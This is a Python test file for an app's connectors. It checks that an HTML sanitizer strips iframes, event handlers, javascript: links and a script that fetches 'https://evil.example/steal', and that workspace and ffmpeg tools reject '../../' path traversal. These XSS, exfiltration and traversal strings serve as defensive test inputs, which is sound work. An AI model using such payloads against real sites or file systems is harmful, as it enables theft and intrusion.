"""Тесты коннекторов: санитайзер HTML, пути, схемы инструментов."""

from __future__ import annotations

from pathlib import Path

from app.connectors.base import ToolContext
from app.connectors.elevenlabs import ElevenLabsConnector
from app.connectors.ffmpeg_tools import FFmpegConnector
from app.connectors.hyperframes import HyperFramesConnector, sanitize_composition
from app.connectors.mcp_connector import McpConnector
from app.connectors.registry import ConnectorRegistry
from app.connectors.workspace import WorkspaceConnector


def make_ctx(tmp_path: Path) -> ToolContext:
    return ToolContext(user_id=1, chat_id=1, project_dir=tmp_path, options={})


def test_sanitizer_removes_iframe_and_handlers():
    dirty = (
        '<div onclick="steal()" data-x="1">'
        '<iframe src="https://evil.example"></iframe>'
        '<a href="javascript:alert(1)">клик</a>'
        "</div>"
    )
    clean = sanitize_composition(dirty)
    assert "<iframe" not in clean
    assert "onclick" not in clean
    assert "javascript:" not in clean
    assert 'data-x="1"' in clean


def test_sanitizer_keeps_gsap_scripts():
    html = (
        '<script src="https://cdn.jsdelivr.net/npm/gsap@3.14.2/dist/gsap.min.js"></script>'
        '<script>const tl = gsap.timeline({paused:true});</script>'
    )
    clean = sanitize_composition(html)
    assert "gsap.min.js" in clean
    assert "gsap.timeline" in clean


def test_sanitizer_drops_dangerous_script_body():
    html = "<script>fetch('https://evil.example/steal')</script>"
    clean = sanitize_composition(html)
    assert "fetch(" not in clean


def test_sanitizer_keeps_local_media():
    html = '<video id="v" src="assets/clip.mp4" data-start="0" data-duration="2"></video>'
    clean = sanitize_composition(html)
    assert 'src="assets/clip.mp4"' in clean
    assert 'data-duration="2"' in clean


async def test_workspace_blocks_path_traversal(tmp_path: Path):
    connector = WorkspaceConnector()
    ctx = make_ctx(tmp_path)

    result = await connector.execute(
        ctx, "workspace_write_file", {"path": "../../evil.txt", "content": "x"}
    )
    assert result.is_error

    result = await connector.execute(
        ctx, "workspace_write_file", {"path": "notes/todo.txt", "content": "x"}
    )
    assert not result.is_error
    assert (tmp_path / "notes" / "todo.txt").exists()


async def test_workspace_lists_files(tmp_path: Path):
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "a.mp4").write_bytes(b"0")
    connector = WorkspaceConnector()
    result = await connector.execute(make_ctx(tmp_path), "workspace_list_assets", {})
    assert "assets/a.mp4" in result.text


async def test_ffmpeg_connector_rejects_escape(tmp_path: Path):
    connector = FFmpegConnector()
    result = await connector.execute(
        make_ctx(tmp_path), "ffprobe_media", {"path": "../../secret.mp4"}
    )
    assert result.is_error


def test_tool_specs_are_valid_json_schema(tmp_path: Path):
    import asyncio

    ctx = make_ctx(tmp_path)
    connectors = [
        HyperFramesConnector(),
        FFmpegConnector(),
        WorkspaceConnector(),
        ElevenLabsConnector(),
        McpConnector(),
    ]
    for connector in connectors:
        specs = asyncio.run(connector.tools(ctx))
        for spec in specs:
            assert spec.name.replace("_", "").isalnum()
            assert spec.description
            assert spec.parameters["type"] == "object"
            assert "properties" in spec.parameters


def test_registry_routes_tool_calls(tmp_path: Path):
    import asyncio

    registry = ConnectorRegistry()
    workspace = WorkspaceConnector()
    registry.register(workspace)

    async def scenario():
        ctx = make_ctx(tmp_path)
        specs = await registry.build_tools(ctx, ["workspace"], lambda _cid: True)
        assert any(spec.name == "workspace_list_assets" for spec in specs)
        result = await registry.execute(ctx, "workspace_list_assets", {})
        return result

    result = asyncio.run(scenario())
    assert not result.is_error
